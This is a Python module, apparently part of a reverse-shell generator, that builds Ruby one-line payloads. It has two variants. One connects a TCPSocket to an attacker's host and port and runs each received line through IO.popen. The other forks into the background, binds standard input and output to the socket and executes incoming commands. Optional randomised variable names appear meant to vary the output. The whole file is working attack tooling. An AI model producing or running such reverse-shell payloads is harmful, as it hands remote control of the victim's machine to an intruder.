import random
from .base import RandomNamePool, ShellGenerator, ShellResult

_VARIANTS = ["tcpsocket", "socket_exec"]


class RubyGenerator(ShellGenerator):
    language = "ruby"

    def _generate(self, lhost: str, lport: int, arch: str, names: RandomNamePool | None) -> ShellResult:
        variant = random.choice(_VARIANTS)

        if variant == "tcpsocket":
            cmd = self._tcpsocket(lhost, lport, names)
        else:
            cmd = self._socket_exec(lhost, lport, names)

        return ShellResult(command=cmd, variant=variant, language=self.language, arch=arch)

    def _tcpsocket(self, lhost: str, lport: int, names: RandomNamePool | None) -> str:
        s = self._var("s", names)
        return (
            f'ruby -rsocket -e \'{s}=TCPSocket.new("{lhost}",{lport});'
            f'while(c={s}.gets);IO.popen(c,"r"){{|f|{s}.print f.read}}end\''
        )

    def _socket_exec(self, lhost: str, lport: int, names: RandomNamePool | None) -> str:
        return (
            f'ruby -rsocket -e \'exit if fork;'
            f'c=TCPSocket.new("{lhost}",{lport});'
            f'$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);'
            f'$stdin.each_line{{|l|l=l.strip;'
            f'next if l.length==0;'
            f'(IO.popen(l,"rb"){{|f|c.print f.read}}) rescue nil}}\''
        )
